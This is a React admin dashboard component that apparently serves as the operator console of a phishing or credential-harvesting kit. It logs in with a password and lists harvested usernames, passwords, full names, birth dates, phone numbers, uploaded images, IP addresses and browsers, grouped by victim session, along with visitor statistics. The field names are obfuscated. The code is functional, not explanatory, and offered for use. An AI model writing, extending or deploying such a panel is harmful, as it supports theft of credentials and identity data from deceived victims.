import React, { useState, useEffect } from 'react';
import axios from 'axios';

interface UserData {
  type: string;
  data: any;
  timestamp: string;
  ip: string;
  userAgent: string;
}

interface Visitor {
  ip: string;
  userAgent: string;
  timestamp: string;
  path: string;
  method: string;
}

interface Stats {
  totalUsers: number;
  totalLogins: number;
  totalVisitors: number;
  uniqueIPs: number;
  lastActivity: string | null;
}

const AdminPanel: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [activeTab, setActiveTab] = useState<'users' | 'visitors'>('users');
  const [userData, setUserData] = useState<UserData[]>([]);
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [stats, setStats] = useState<Stats | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [deletingId, setDeletingId] = useState<number | null>(null);
  const [showDeleteDialog, setShowDeleteDialog] = useState(false);
  const [deleteIndex, setDeleteIndex] = useState<number | null>(null);
  const [showSuccessAlert, setShowSuccessAlert] = useState(false);
  const [successMessage, setSuccessMessage] = useState('');

  const API_BASE_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001/api';

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await axios.post(`${API_BASE_URL}/admin/login`, { password });
      if (response.data.success) {
        setIsAuthenticated(true);
        // Load data only once after successful login
        await loadData();
      } else {
        setError('Invalid password');
      }
    } catch (err) {
      setError('Login failed');
    } finally {
      setLoading(false);
    }
  };

  const loadData = async () => {
    try {
      setLoading(true);
      setError('');
      setShowSuccessAlert(false);
      
      const [userResponse, visitorsResponse, statsResponse] = await Promise.all([
        axios.get(`${API_BASE_URL}/admin/user-data`),
        axios.get(`${API_BASE_URL}/admin/visitors`),
        axios.get(`${API_BASE_URL}/admin/stats`)
      ]);

      setUserData(userResponse.data.data);
      setVisitors(visitorsResponse.data.data);
      setStats(statsResponse.data.stats);
      
      console.log('Data refreshed successfully');
      
      // Show refresh success message
      setSuccessMessage('Data refreshed successfully!');
      setShowSuccessAlert(true);
      
      // Auto-hide after 2 seconds
      setTimeout(() => {
        setShowSuccessAlert(false);
      }, 2000);
    } catch (err) {
      setError('Failed to load data');
      console.error('Refresh error:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleDeleteClick = (index: number) => {
    setDeleteIndex(index);
    setShowDeleteDialog(true);
  };

  const handleDeleteConfirm = async () => {
    if (deleteIndex === null) return;

    setDeletingId(deleteIndex);
    setShowDeleteDialog(false);
    
    try {
      // Get the combined user data to find the original entries to delete
      const sessionGroups: { [key: string]: UserData[] } = {};
      
      userData.forEach(item => {
        const sessionKey = `${item.ip}-${item.timestamp.split('T')[0]}`;
        if (!sessionGroups[sessionKey]) {
          sessionGroups[sessionKey] = [];
        }
        sessionGroups[sessionKey].push(item);
      });
      
      const sessionKeys = Object.keys(sessionGroups);
      const sessionToDelete = sessionKeys[deleteIndex];
      const entriesToDelete = sessionGroups[sessionToDelete];
      
      console.log('Deleting session with entries:', entriesToDelete.length);
      console.log('Session to delete:', sessionToDelete);
      console.log('Entries to delete:', entriesToDelete);
      
      // Delete all entries in this session by finding their current indices
      let deletedCount = 0;
      for (const entry of entriesToDelete) {
        // Find the current index of this entry in the userData array
        const currentIndex = userData.findIndex(item => 
          item.timestamp === entry.timestamp && 
          item.type === entry.type && 
          item.ip === entry.ip
        );
        
        console.log(`Looking for entry:`, entry);
        console.log(`Found at index:`, currentIndex);
        
        if (currentIndex !== -1) {
          const response = await axios.delete(`${API_BASE_URL}/admin/delete-data/${currentIndex}`);
          console.log('Delete response:', response.data);
          deletedCount++;
        }
      }
      
      console.log(`Deleted ${deletedCount} entries from session`);
      
      // Reload data to get updated stats
      await loadData();
      console.log('User session deleted successfully');
      
      // Show success alert
      setSuccessMessage('User session deleted successfully!');
      setShowSuccessAlert(true);
      
      // Auto-hide after 3 seconds
      setTimeout(() => {
        setShowSuccessAlert(false);
      }, 3000);
      
    } catch (err) {
      console.error('Delete error:', err);
      setError('Failed to delete user session');
    } finally {
      setDeletingId(null);
      setDeleteIndex(null);
    }
  };

  const handleDeleteCancel = () => {
    setShowDeleteDialog(false);
    setDeleteIndex(null);
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString();
  };

  const getBrowserInfo = (userAgent: string) => {
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    return 'Other';
  };

  const renderUserData = () => {
    // Group data by session (using IP + timestamp as session identifier)
    const sessionGroups: { [key: string]: UserData[] } = {};
    
    userData.forEach(item => {
      const sessionKey = `${item.ip}-${item.timestamp.split('T')[0]}`;
      if (!sessionGroups[sessionKey]) {
        sessionGroups[sessionKey] = [];
      }
      sessionGroups[sessionKey].push(item);
    });
    
    // Create combined user entries from session groups
    const combinedUsers = Object.values(sessionGroups).map(sessionData => {
      // Sort by timestamp to get the order
      sessionData.sort((a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime());
      
      // Combine all data from different steps
      const combinedData = {
        xusr: '',
        xpss: '',
        xname1: '',
        xname2: '',
        xdob: '',
        xtel: '',
        filename: '',
        originalName: '',
        size: 0
      };
      
      let latestTimestamp = '';
      let latestUserAgent = '';
      let latestIp = '';
      
      sessionData.forEach(item => {
        // Combine data from all steps
        if (item.data.xusr) combinedData.xusr = item.data.xusr;
        if (item.data.xpss) combinedData.xpss = item.data.xpss;
        if (item.data.xname1) combinedData.xname1 = item.data.xname1;
        if (item.data.xname2) combinedData.xname2 = item.data.xname2;
        if (item.data.xdob) combinedData.xdob = item.data.xdob;
        if (item.data.xtel) combinedData.xtel = item.data.xtel;
        if (item.data.filename) {
          combinedData.filename = item.data.filename;
          combinedData.originalName = item.data.originalName;
          combinedData.size = item.data.size;
        }
        
        // Keep the latest timestamp, user agent, and IP
        if (item.timestamp > latestTimestamp) {
          latestTimestamp = item.timestamp;
          latestUserAgent = item.userAgent;
          latestIp = item.ip;
        }
      });
      
      return {
        data: combinedData,
        timestamp: latestTimestamp,
        userAgent: latestUserAgent,
        ip: latestIp,
        sessionData: sessionData // Keep reference to original data for deletion
      };
    });
    
    return (
      <div className="admin-content">
        <h3>All User Data ({combinedUsers.length} users)</h3>
        <div className="data-table">
          <table>
            <thead>
              <tr>
                <th>Username</th>
                <th>Password</th>
                <th>First Name</th>
                <th>Last Name</th>
                <th>Birth Date</th>
                <th>Phone</th>
                <th>File</th>
                <th>IP Address</th>
                <th>Browser</th>
                <th>Date</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              {combinedUsers.map((user, index) => (
                <tr key={index}>
                  <td>{user.data.xusr || '-'}</td>
                  <td>{user.data.xpss ? '***' : '-'}</td>
                  <td>{user.data.xname1 || '-'}</td>
                  <td>{user.data.xname2 || '-'}</td>
                  <td>{user.data.xdob || '-'}</td>
                  <td>{user.data.xtel || '-'}</td>
                  <td>
                    {user.data.filename ? (
                      <div className="file-display">
                        <img 
                          src={`${API_BASE_URL.replace('/api', '')}/uploads/${user.data.filename}`}
                          alt={user.data.originalName}
                          className="uploaded-image"
                          onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${user.data.filename}`)}
                          onError={(e) => {
                            e.currentTarget.style.display = 'none';
                            const nextElement = e.currentTarget.nextElementSibling as HTMLElement;
                            if (nextElement) {
                              nextElement.style.display = 'block';
                            }
                          }}
                        />
                        <div className="file-info" style={{display: 'none'}}>
                          {user.data.originalName}
                          <br />
                          <small>({Math.round(user.data.size / 1024)}KB)</small>
                        </div>
                      </div>
                    ) : '-'}
                  </td>
                  <td className="ip-address">{user.ip}</td>
                  <td>{getBrowserInfo(user.userAgent)}</td>
                  <td>{formatDate(user.timestamp)}</td>
                  <td>
                    <button
                      className="delete-btn"
                      onClick={() => handleDeleteClick(index)}
                      disabled={deletingId === index}
                      title="Delete this user session"
                    >
                      {deletingId === index ? (
                        <span className="loading-spinner-small">⏳</span>
                      ) : (
                        <span className="delete-icon">🗑️</span>
                      )}
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    );
  };

  const renderVisitors = () => {
    return (
      <div className="admin-content">
        <h3>Site Visitors ({visitors.length} visits)</h3>
        <div className="data-table">
          <table>
            <thead>
              <tr>
                <th>IP Address</th>
                <th>Browser</th>
                <th>Date & Time</th>
              </tr>
            </thead>
            <tbody>
              {visitors.slice(-50).reverse().map((visitor, index) => (
                <tr key={index}>
                  <td className="ip-address">{visitor.ip}</td>
                  <td>{getBrowserInfo(visitor.userAgent)}</td>
                  <td>{formatDate(visitor.timestamp)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    );
  };

  if (!isAuthenticated) {
    return (
      <div className="admin-login">
        <div className="login-form">
          <h2>Admin Panel</h2>
          <form onSubmit={handleLogin}>
            <div className="form-group">
              <label>Password:</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter admin password"
                required
              />
            </div>
            {error && <div className="error">{error}</div>}
            <button type="submit" disabled={loading}>
              {loading ? 'Logging in...' : 'Login'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="admin-panel">
      {/* Success Alert */}
      {showSuccessAlert && (
        <div className="success-alert">
          <div className="alert-content">
            <span className="alert-icon">✅</span>
            <span className="alert-message">{successMessage}</span>
            <button 
              className="alert-close" 
              onClick={() => setShowSuccessAlert(false)}
            >
              ×
            </button>
          </div>
        </div>
      )}

      <div className="admin-header">
        <h1>Admin Panel</h1>
        <div className="header-buttons">
          <button 
            onClick={loadData} 
            className="refresh-btn"
            disabled={loading}
          >
            {loading ? (
              <>
                <span className="loading-spinner-small">⏳</span>
                Refreshing...
              </>
            ) : (
              'Refresh Data'
            )}
          </button>
          <button onClick={() => setIsAuthenticated(false)} className="logout-btn">
            Logout
          </button>
        </div>
      </div>

      {stats && (
        <div className="stats-grid">
          <div className="stat-card">
            <h3>Total Users</h3>
            <p>{stats.totalUsers}</p>
          </div>
          <div className="stat-card">
            <h3>Total Logins</h3>
            <p>{stats.totalLogins}</p>
          </div>
          <div className="stat-card">
            <h3>Site Visitors</h3>
            <p>{stats.totalVisitors}</p>
          </div>
          <div className="stat-card">
            <h3>Unique IPs</h3>
            <p>{stats.uniqueIPs}</p>
          </div>
        </div>
      )}

      <div className="admin-tabs">
        <button
          className={activeTab === 'users' ? 'active' : ''}
          onClick={() => setActiveTab('users')}
        >
          User Data
        </button>
        <button
          className={activeTab === 'visitors' ? 'active' : ''}
          onClick={() => setActiveTab('visitors')}
        >
          Site Visitors
        </button>
      </div>

      {activeTab === 'users' ? renderUserData() : renderVisitors()}

      {/* Image Modal */}
      {selectedImage && (
        <div className="image-modal" onClick={() => setSelectedImage(null)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <button className="close-btn" onClick={() => setSelectedImage(null)}>
              ×
            </button>
            <img src={selectedImage} alt="Full size" className="full-image" />
          </div>
        </div>
      )}

      {/* Delete Confirmation Dialog */}
      {showDeleteDialog && (
        <div className="delete-modal" onClick={handleDeleteCancel}>
          <div className="delete-dialog" onClick={(e) => e.stopPropagation()}>
            <div className="dialog-header">
              <h3>Confirm Delete</h3>
            </div>
            <div className="dialog-body">
              <p>Are you sure you want to delete this data entry?</p>
              <p className="warning-text">This action cannot be undone.</p>
            </div>
            <div className="dialog-footer">
              <button className="cancel-btn" onClick={handleDeleteCancel}>
                Cancel
              </button>
              <button className="confirm-delete-btn" onClick={handleDeleteConfirm}>
                Delete
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminPanel;
